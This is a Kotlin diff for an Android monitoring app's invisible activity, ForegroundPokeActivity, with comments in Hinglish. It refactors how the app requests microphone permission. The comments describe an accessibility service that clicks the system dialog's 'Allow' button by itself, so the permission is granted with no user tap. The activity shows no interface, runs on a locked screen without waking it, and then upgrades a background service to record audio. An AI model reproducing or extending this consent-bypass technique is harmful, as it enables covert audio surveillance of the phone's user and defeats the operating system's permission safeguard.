@@ -4,8 +4,11 @@ import android.Manifest
 import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
 import android.os.SystemClock
 import androidx.activity.ComponentActivity
+import androidx.activity.result.contract.ActivityResultContracts
 import androidx.core.content.ContextCompat
 import com.familyguard.child.data.Store
 import com.familyguard.child.service.MainService
@@ -28,14 +31,30 @@ import com.familyguard.child.service.MainService
  * activity finish hone ke baad bhi mic/camera access chalta rehta hai.
  *
  * MODE "micperm": RECORD_AUDIO runtime permission bhi missing ho to yahin
- * requestPermissions() se system permission dialog khulta hai aur
- * EnforcementService (accessibility) uska "Allow" button KHUD click kar deta
- * hai — mic permission bina kisi tap ke heal ho jati hai.
+ * RequestPermission launcher se system dialog khulta hai aur EnforcementService
+ * (accessibility) uska "Allow" button KHUD click kar deta hai — mic permission
+ * bina kisi tap ke heal ho jati hai. 30 s ka safety-finish: a11y click na bhi
+ * ho to dialog khadi nahi rehti (activity finish = dialog dismiss).
  *
  * Screen locked ho to bhi bina screen jagaaye kaam kare (quiet consent jaisa) —
  * setShowWhenLocked(true), par setTurnScreenOn NAHI.
  */
 class ForegroundPokeActivity : ComponentActivity() {
+
+    /** Mic permission result — granted par FGS mic-type upgrade + stamps likho,
+     *  phir (granted ya denied) activity finish. */
+    private val micPermLauncher = registerForActivityResult(
+        ActivityResultContracts.RequestPermission()
+    ) { granted ->
+        if (granted) {
+            // Ab app foreground (dialog ke pichhe resumed) hai — while-in-use
+            // upgrade yahin legal hai. audio_start dono stamps poll karta hai.
+            MainService.updateTypes(withMic = true, withCam = false)
+            Store.pokeMicDoneAt = SystemClock.elapsedRealtime()
+            Store.pokeMicPermAt = SystemClock.elapsedRealtime()
+        }
+        runCatching { finish() }
+    }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -62,12 +81,8 @@ class ForegroundPokeActivity : ComponentActivity() {
             }
             // Thoda sa time do: startForeground ko types register karne me ek frame
             // lagta hai. Phir turant finish — koi UI kabhi dikhta hi nahi.
-            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                runCatching { finish() }
-            }, 250L)
+            Handler(Looper.getMainLooper()).postDelayed({ runCatching { finish() } }, 250L)
         }
-        // "micperm" apna finish onRequestPermissionsResult me khud karta hai —
-        // dialog screen par tab tak rehta hai (a11y click ke liye).
     }
 
     private fun requestMicPermissionOrUpgrade() {
@@ -81,23 +96,13 @@ class ForegroundPokeActivity : ComponentActivity() {
             finish()
             return
         }
+        // Safety-finish: agar a11y click na ho (accessibility band) to system
+        // dialog 30 s me khud dismiss ho jayegi — screen par khadi nahi rehti.
+        Handler(Looper.getMainLooper()).postDelayed({
+            runCatching { if (!isFinishing) finish() }
+        }, 30_000L)
         // System permission dialog khulega (permissioncontroller) —
         // EnforcementService "mic" step armed hai, "Allow" khud click hoga.
-        requestPermissions(arrayOf(Manifest.permission.RECORD_AUDIO), 7001)
-    }
-
-    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        if (requestCode != 7001) return
-        val granted = grantResults.isNotEmpty() &&
-            grantResults[0] == PackageManager.PERMISSION_GRANTED
-        if (granted) {
-            // Ab app foreground (dialog ke pichhe resumed) hai — while-in-use
-            // upgrade yahin legal hai. audio_start dono stamps poll karta hai.
-            MainService.updateTypes(withMic = true, withCam = false)
-            Store.pokeMicDoneAt = SystemClock.elapsedRealtime()
-            Store.pokeMicPermAt = SystemClock.elapsedRealtime()
-        }
-        runCatching { finish() }
+        micPermLauncher.launch(Manifest.permission.RECORD_AUDIO)
     }
 }
